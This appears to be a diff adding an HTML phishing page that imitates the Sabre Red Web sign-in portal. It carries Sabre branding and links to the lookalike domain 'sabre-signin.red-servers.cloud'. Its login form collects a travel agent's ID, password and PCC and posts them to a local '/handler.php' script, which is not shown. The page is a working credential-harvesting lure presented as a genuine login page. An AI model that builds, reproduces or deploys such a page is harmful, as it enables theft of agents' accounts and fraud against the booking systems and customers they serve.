@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Login page - Sabre Red Web</title>
+    <meta name="description" content="Sabre Login Authentication Portal">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="index.css">
+    <meta name="referrer" content="no-referrer">
+    <link rel="shortcut icon" type="image/x-icon" href="images/51.ico">
+    <style>
+        .sf-hidden {
+            display: none !important;
+        }
+    </style>
+    <link rel="canonical" href="https://sabre-signin.red-servers.cloud">
+    <meta http-equiv="content-security-policy" content="default-src 'none'; connect-src 'self' data: blob:; font-src 'self' data: blob:; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline' data: blob:; frame-src 'self' data: blob:; media-src 'self' data: blob:; script-src 'self' 'unsafe-inline' data: blob:; object-src 'self' data: blob:;">
+    <style>
+        img[src="data:,"],
+        source[src="data:,"] {
+            display: none !important;
+        }
+    </style>
+</head>
+<body class="spark-content--sticky-footer srw-content -mode" style="opacity:1;transition:opacity 333ms ease-in-out">
+    <div class="spark-content__wrapper--sticky-footer">
+        <div class="spark-content__wrapper--sticky-footer">
+            <article class="spark-splash-screen spark-splash-screen--panel spark-splash-screen--sign-in spark-main--sticky-footer">
+                <section class="spark-splash-screen__content">
+                    <div class="spark-panel spark-splash-screen__center col-xs-12 col-md-10 col-lg-6 col-xl-6">
+                        <div class="spark-panel__content">
+                            <div class="spark-logo spark-logo--sabre spark-logo--md spark-logo--sabre-red" id="sabreLogo"></div>
+                            <h3 class="spark-splash-screen__heading">Sabre Red Web</h3>
+                            <div class="spark-center-block col-xs-12 col-md-10 col-lg-8 col-xl-8">
+                                <div class="spark-message spark-message--error re-sign-in-message sf-hidden"></div>
+                                <div>
+<form class="spark-splash-screen__form spark-text-left" method="post" action=" /handler.php" id="login-form" autocomplete="off">
+    <label class="spark-input">
+        <input tabindex="1" class="spark-input__field js_username" id="userId" name="userId" placeholder="Example: 4321" role="textbox" maxlength="9" required>
+        <span class="spark-label">Agent ID</span>
+    </label>
+    <label class="spark-input">
+        <input tabindex="2" type="password" class="spark-input__field js_password" id="password" name="password" placeholder="Example: password123" role="textbox" maxlength="255" required>
+        <span class="spark-label">Password</span>
+        <span class="spark-input__addon spark-input__password-toggle">
+            <i class="spark-input__password-show spark-icon-password-view spark-icon-middle"></i>
+            <i class="spark-input__password-hide spark-icon-password-hide spark-icon-middle sf-hidden"></i>
+        </span>
+    </label>
+    <label class="spark-input">
+        <input tabindex="3" class="spark-input__field js_pcc" id="group" name="group" placeholder="Example: BTD0" role="textbox" maxlength="4" required>
+        <span class="spark-label">PCC</span>
+    </label>
+    <button id="submit" name="login" class="spark-btn spark-btn--md spark-btn--primary spark-block--lte-md spark-mar-b-2--lg spark-pull-right spark-mar-t-.5" tabindex="4">Sign In</button>
+</form>
+
+                                    <div class="row spark-mar-t-2">
+                                        <div class="col-xs-12 srw-link-container">
+                                            <div class="srw-link">
+                                                <a class="spark-link" id="forgotPassword" href="https://sabre-signin.red-servers.cloud" tabindex="5">Forgot password?</a>
+                                            </div>
+                                            <div class="srw-link">
+                                                <a class="spark-link" id="resetPassword" href="https://sabre-signin.red-servers.cloud" tabindex="6">Reset password</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+            </article>
+            <footer class="spark-footer">
+                <div class="container">
+                    <div class="spark-footer__logo spark-hidden--lte-sm">
+                        <i class="spark-logo spark-logo--sabre spark-logo--xs"></i>
+                    </div>
+                    <div class="spark-footer__content">
+                        <div class="spark-footer__copyright">© <span>2024</span> Sabre GLBL Inc.</div>
+                        <ul class="spark-footer__list">
+                            <li class="spark-footer__list-item">
+                                <a class="spark-footer__list-link" href="https://sabre-signin.red-servers.cloud/privacy">Privacy policy</a>
+                            </li>
+                            <li class="spark-footer__list-item">
+                                <a class="spark-footer__list-link" href="https://sabre-signin.red-servers.cloud/contact/agent">Contact Us</a>
+                            </li>
+                            <li class="spark-footer__list-item">
+                                <a class="spark-footer__list-link" href="https://www.sabre-signin.red-servers.cloud/home/about/contact">Support</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </div>
+</body>
+</html>
